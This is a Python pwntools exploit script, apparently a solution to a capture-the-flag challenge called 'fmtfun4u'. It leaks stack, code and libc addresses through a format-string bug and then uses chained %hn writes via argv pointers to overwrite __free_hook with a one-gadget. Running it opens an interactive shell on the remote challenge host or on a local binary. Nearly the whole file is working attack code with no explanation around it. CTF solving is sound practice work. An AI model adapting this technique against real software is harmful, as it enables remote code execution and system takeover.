import pwn
import pwnlib
from pwnlib import args
import time

PIPE_CLEAN_TIME = 0.1

printf_plt_offset = 0x7f8
printf_got_offset = 0x200fc0

def write_37(process, data):
    global leak_argv_0

    p = process
    for i in range(4):
        p.clean(PIPE_CLEAN_TIME)
        p.send('%'+str( (leak_argv_0+i*2) & 0xFFFF)+'c%11$hn\x00')
        # 11$ -> 37$ -> argv[0]+2i -> './program_name'
        p.clean(PIPE_CLEAN_TIME)
        value = (data >> (16*i)) & 0xFFFF
        if value == 0:
            p.send('%37$hn\x00')
        else:
            p.send('%'+str(value)+'c%37$hn\x00')

    # reset 37$
    p.clean(PIPE_CLEAN_TIME)
    p.send('%'+str( (leak_argv_0 & 0xFFFF) )+'c%11$hn\x00')

    return None

def write_data(process, address, data):
    global argv_0_index

    p = process
    for i in range(4):
        write_37(process, address+i*2)
        # 11$ -> 37$ -> argv[0] -> address + i*2
        p.clean(PIPE_CLEAN_TIME)
        value = (data >> (16*i)) & 0xFFFF
        if value == 0:
            p.send('%'+str(argv_0_index)+'$hn\x00')
        else:
            p.send('%'+str(value)+'c%'+str(argv_0_index)+'$hn\x00')

    write_37(process, address)
    # 11$ -> 37$ -> argv[0] -> address -> data
    return None

if __name__ == '__main__':
    global leak_argv_0
    global argv_0_index

    if args.args['REMOTE']:
        p = pwn.connect('csie.ctf.tw', 10136)
    else:
        p = pwn.process('./fmtfun4u-a64d07583f754c871ba2bc60ecd4045bb2202de2')

    elf = pwn.ELF('./fmtfun4u-a64d07583f754c871ba2bc60ecd4045bb2202de2')
    libc_elf = pwn.ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

    # leak code_base and libc_base
    print p.recvuntil(':')
    p.send('%8$p\n%9$p\n%11$p')
    leak_rbp = int(p.recvline()[:-1], 16)
    leak_libc_start_main = int(p.recvline()[:-1], 16)-240
    leak_and_argv = int(p.recvline()[:-1], 16)

    libc_base = leak_libc_start_main - libc_elf.symbols['__libc_start_main']
    code_base = leak_rbp - elf.symbols['__libc_csu_init']

    free_hook_address = libc_elf.symbols['__free_hook'] + libc_base
    system_address = libc_elf.symbols['system'] + libc_base

    print 'leak_and_argv:', hex(leak_and_argv)
    print 'free_hook_address:', hex(free_hook_address)
    print 'codebase:', hex(code_base)

    p.recvuntil(':') # Input:
    p.send('%37$p\x00')
    leak_argv_0 = int(p.recvline()[:-1], 16)
    argv_0_index = (leak_argv_0 - leak_and_argv)//0x8 + 37
    leak_argv_0 = (argv_0_index - 37)*0x8 + leak_and_argv # align

    print 'leak_argv_0:', hex(leak_argv_0)
    print 'index argv0:', argv_0_index
    # close(4)
    # argv chain
    # 11$ -> 37$ -> argv[0] -> './program_name'
    p.send('%'+str( (leak_and_argv-0xE8-4) & 0xFFFF)+'c%11$hn\x00')

    # 11$ -> 37$ -> &i
    # close(3)
    p.send('%10000c%37$hn\x00') # change i to 10000
    p.clean(PIPE_CLEAN_TIME*3)
    # write whatever i want
    # 11$ -> 37$ -> argv[0] -> './program_name'
    # free_hook = onegadget
    write_data(p, address=free_hook_address, data=0xf0274+libc_base) # one gadget
    p.send('%66666c\x00')

    p.clean(5)
    p.interactive()
